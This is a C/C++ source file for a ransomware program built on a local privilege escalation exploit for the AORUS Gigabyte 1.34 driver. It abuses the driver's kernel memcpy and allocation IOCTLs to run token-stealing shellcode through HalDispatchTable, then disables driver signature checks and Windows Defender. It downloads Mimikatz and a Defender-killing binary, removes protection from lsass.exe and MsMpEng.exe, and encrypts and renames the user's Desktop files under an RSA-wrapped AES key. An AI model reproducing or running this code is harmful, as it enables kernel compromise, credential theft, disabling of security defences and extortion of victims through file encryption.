/* AORUS Gigabyte 1.34 Driver LPE Exploit */

#include <windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <ShlObj.h>
#include <string.h>
#include <strsafe.h>
#include "cipher.h"


typedef NTSTATUS(NTAPI* _NtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval);

_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");

typedef struct _gio_memcpy_struct {
	LPVOID dest;
	LPVOID src;
	DWORD size;
} gio_memcpy_struct;


HANDLE hDriver;
HANDLE open_driver() {
	hDriver = CreateFileA("\\\\.\\GIOV2", 0xC0000000, 0, NULL, 0x3, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open a handle to target driver.");
		exit(0);
		return FALSE;
	}
	return hDriver;
}

BOOL gio_memcpy(LPVOID dest, LPVOID src, DWORD size)
{
	gio_memcpy_struct arg_struct = { dest, src, size };

	BYTE out_buffer[0x30] = { 0 };
	DWORD returned = 0;

	/* 0xC3502808 => IoControlCode to call a function that is a memcpy-like in the kernel */
	DeviceIoControl(hDriver, 0xC3502808, &arg_struct, sizeof(arg_struct), out_buffer, sizeof(out_buffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}


ULONG64 gio_memory_allocate(DWORD buffer_len) {

	ULONG64 out_buffer[2] = { 0 };

	/* 0xC3502800 => IoControlCode to call a function that uses the kernel function MmAllocateContigousMemory */
	DeviceIoControl(hDriver, 0xC3502800, &buffer_len, sizeof(buffer_len), out_buffer, sizeof(out_buffer), NULL, NULL);
	return out_buffer[0];
}


LPVOID get_kernel_base_address()
{
	LPVOID image_base_addresses_array[1024];
	DWORD lpcbNeeded;

	BOOL base_eunm = EnumDeviceDrivers(image_base_addresses_array, sizeof(image_base_addresses_array), &lpcbNeeded);

	if (base_eunm == 0)
	{
		printf("[-] EnumDeviceDrivers Failed %d\n", GetLastError());
		exit(1);
	}

	/* the kernel base address is the first address in the returned array. */
	LPVOID kerne_base_address = image_base_addresses_array[0];
	return kerne_base_address;
}

char shellcode[] = "\x65\x48\x8b\x04\x25\x88\x01\x00\x00"  // mov rax,QWORD PTR gs:0x188      => Pointing at _KTHREAD structure
"\x48\x8b\x80\x20\x02\x00\x00"							   // mov rax,QWORD PTR [rax+0x220]   => Pointing at _KPROCESS/_EPROCESS structure
"\x48\x89\xc1"							                   // mov rcx,rax					   => Saving the _KPROCESS/_EPROCESS address
"\x48\x8b\x80\xe8\x02\x00\x00"							   // mov rax,QWORD PTR [rax+0x2e8]   => Next ActiveProcessLinks Entry
"\x48\x2d\xe8\x02\x00\x00"								   // sub rax,0x2e8				   => Pointing at the beginning of _EPROCESS structure
"\x4c\x8b\x88\xe0\x02\x00\x00"							   // mov r9,QWORD PTR [rax+0x2e0]	
"\x49\x83\xf9\x04"										   // cmp r9,0x4					   => Compare the saved Parent PID (in r8)  with the UniqueProcessId
"\x75\xe6"												   // jne 0x13						  
"\x48\x8b\x90\x48\x03\x00\x00"							   // mov rdx,QWORD PTR [rax+0x348]   => Pointing at Token field in System's _EPROCESS
"\x48\x89\x91\x48\x03\x00\x00"							   // mov QWORD PTR [rcx+0x348],rdx   => Replace the cmd.exe Token with the system Token
"\xc3";													   // ret 

char* shellcode_raw = shellcode;

int main(void)
{
	/* Opening the driver */
	hDriver = open_driver();
	printf("RobinHood LPE exploit Windows 8.1\n");

	/* 1 - Getting the kernel base address */
	LPVOID kerne_base_address = get_kernel_base_address();
	printf("[+] Kernel base address: 0x%llx\n", kerne_base_address);

	/* 2 - Writing the token stealing shellcode into memory */

	/* Allocating memory */
	printf("[+] Writing the shellcode to the memory\n");
	ULONG64 shellcode_address = gio_memory_allocate(sizeof(shellcode));
	printf("[+] shellcode address: 0x%llx\n", shellcode_address);

	/* Writing the shellcode raw data to `shellcode_address` */
	gio_memcpy((LPVOID)shellcode_address, shellcode_raw, sizeof(shellcode));

	/* 3 - Getting HalDispatchTable+0x8 address */

	/* Getting `HalDispatchTable` in user mode */
	HMODULE kernel_handle = LoadLibraryA("ntoskrnl.exe");
	LPVOID HalDispatchTable_user_address = (LPVOID)GetProcAddress(kernel_handle, "HalDispatchTable");

	LPVOID HalDispatchTable_offset = (LPVOID)((ULONG64)HalDispatchTable_user_address - (ULONG64)kernel_handle);

	LPVOID HalDispatchTable_kernel_address = (LPVOID)((ULONG64)HalDispatchTable_offset + (ULONG64)kerne_base_address);

	LPVOID HalDispatchTable_8 = (LPVOID)((ULONG64)HalDispatchTable_kernel_address + 8);
	printf("[+] HalDispatchTable+0x8 address: 0x%llx\n", HalDispatchTable_8);


	/* 4 - Overwriting HalDispatchTable+0x8 with shellcode address */

	/* Getting the original HalDispatchTable + 0x8 first so we can restore it later */
	PULONG64 HalDispatchTable_8_original_value;
	gio_memcpy(&HalDispatchTable_8_original_value, HalDispatchTable_8, 8);
	printf("[+] HalDispatchTable+0x8 original value: 0x%llx\n", HalDispatchTable_8_original_value);

	/* Overwriting the shellcode_address to HalDispatchTable+0x8 */
	printf("[+] Overwriting HalDispatchTable+0x8 with shellcode address\n");
	gio_memcpy(HalDispatchTable_8, &shellcode_address, 8);

	/* 5 - Calling NtQueryIntervalProfile to execute the shellcode (stored in HalDispatchTable+0x8)  */
	printf("[+] Calling NtQueryIntervalProfile to execute the shellcode\n");
	ULONG temp;
	NtQueryIntervalProfile(0x10, &temp);

	/* 6 - Restoring the original pointer of "HalDispatchTable+0x8" to avoid BSOD */
	printf("[+] Restoring the original value of HalDispatchTable+0x8 to avoid BSOD\n");
	gio_memcpy(HalDispatchTable_8, &HalDispatchTable_8_original_value, 8);

	/* 7 - Disabling Windows DSE & Windows security services after getting NT SYSTEM rights */
	printf("[+] Disabling Windows DSE \n");
	system("bcdedit.exe /set nointegritychecks on");

	/* Disabling security notifications */
	system("PowerShell -WindowStyle hidden -Command \x22& {Get-Process Explorer | ForEach-Object{$_.Id; [Microsoft.PowerShell.Utility.PSObject].Assembly.GetType('System.Threading.Thread').InvokeMember('Sleep', 'Public,Static', $null, $null, 1); $_.Kill() }}\x22");

	/* Disabling Windows security services */
	system("powershell -WindowStyle hidden ; Set-MpPreference -DisableBehaviorMonitoring 1 "
		"-DisablePrivacyMode 1 "
		"-DisableIntrusionPreventionSystem 1 "
		"-DisableIOAVProtection 1 "
		"-DisableScriptScanning 1 "
		"-DisableScanningMappedNetworkDrivesForFullScan 1 "
		"-DisableScanningNetworkFiles 1 "
		"-DisableRealtimeMonitoring 1 "
		"-DisableCatchupFullScan 1 "
		"-DisableCatchupQuickScan 1 "
		"-DisableEmailScanning 1 "
		"-DisableRemovableDriveScanning 1 "
		"-DisableRestorePoint 1");

	/* 8 - Getting Mimikatz and mimidrv.sys */
	char command[] = "";
	char *username;
	size_t len;
	_dupenv_s(&username, &len, "username");

	strcat(command, "powershell -WindowStyle hidden ; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ;");
	strcat(command, "curl -Uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -OutFile C:\\Users\\");
	strcat(command, username);
	strcat(command, "\\AppData\\Local\\Temp\\mimi.zip; Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\");
	strcat(command, username);
	strcat(command, "\\AppData\\Local\\Temp\\mimi.zip' , 'C:\\Users\\");
	strcat(command, username);
	strcat(command, "\\AppData\\Local\\Temp\\mimi')");

	system(command);

	/* 9 - Loading mimidrv & Disabling protections on Windows security services that are still running */
	char load_command[] = "";
	strcat(load_command, "powershell -WindowStyle hidden ; cd C:\\Users\\");
	strcat(load_command, username);
	strcat(load_command, "\\AppData\\Local\\Temp\\mimi\\x64 ; C:\\Users\\");
	strcat(load_command, username);
	strcat(load_command, "\\AppData\\Local\\Temp\\mimi\\x64\\mimikatz.exe privilege::debug !+ '!processProtect /process:MsMpEng.exe /remove' '!processProtect /process:lsass.exe /remove' 'crypto::capi' exit ; ");
	strcat(load_command, "sc qc mimidrv");

	system(load_command);

	/* 10 - Stopping Windows Defender service */
	char kill_defender[] = "";
	char exec[] = "";
	strcat(kill_defender, "powershell -WindowStyle hidden ; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ;");
	strcat(kill_defender, "curl -Uri https://github.com/rbmm/DisableSvc/raw/main/x64/btsp.exe -OutFile C:\\Users\\");
	strcat(kill_defender, username);
	strcat(kill_defender, "\\AppData\\Local\\Temp\\btsp.exe;");

	strcat(exec, "C:\\Users\\");
	strcat(exec, username);
	strcat(exec, "\\AppData\\Local\\Temp\\btsp.exe; Stop-Process -Name btsp -f;");

	system(kill_defender);
	system(exec);

	/* 11 - Encrypting files */
	// Init Provider
	HCRYPTPROV hCryptProv;
	if (!CryptAcquireContext(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		std::cerr << "Error Context Crypto Provider :" << GetLastError() << std::endl;
		return 1;
	}

	/* The final executable need to have the RSA public key at the end */
	/* Import public key RSA */
	HCRYPTKEY pubKey;
	importRSAKey(hCryptProv, pubKey);
	if (!pubKey) {
		std::cerr << "Cannot import RSA public key ! " << std::endl;
	}

	/* Generation key */
	HCRYPTKEY hKey;
	if (!CryptGenKey(hCryptProv, CALG_AES_128, CRYPT_EXPORTABLE, &hKey))
	{
		ErrorExit("Gen Key");
		return 1;
	}

	char bufferPath[MAX_PATH];
	GetTempPath(MAX_PATH, bufferPath);
	std::string tempPath(bufferPath);
	export_key(tempPath, hKey, pubKey);

	std::vector<std::string> filePath;

	/* Finding the files in the Desktop folder */
	PWSTR pszPath = NULL;
	HRESULT result = SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &pszPath);
	if (result != S_OK) {
		std::cerr << "Not able to find the user desktop directory" << std::endl;
	}
	std::wstring desktopPath(pszPath);
	CoTaskMemFree(pszPath);

	findAllFilesInPath(filePath, std::string(desktopPath.begin(), desktopPath.end()));

	std::string path = "C:\\Users\\Public\\Desktop\\";
	findAllFilesInPath(filePath, path);

	/* File encryption */
	for (auto &it : filePath){
		encrypt_file(it, hKey);
	}

	/* Dead Store Elimination for the keys */
	CryptDestroyKey(hKey);
	CryptDestroyKey(pubKey);
	CryptReleaseContext(hCryptProv, 0);

	/* Rename all encrypted files */
	renameFiles(filePath);


	/* Cleanup */
	CloseHandle(hDriver);
	return 0;
}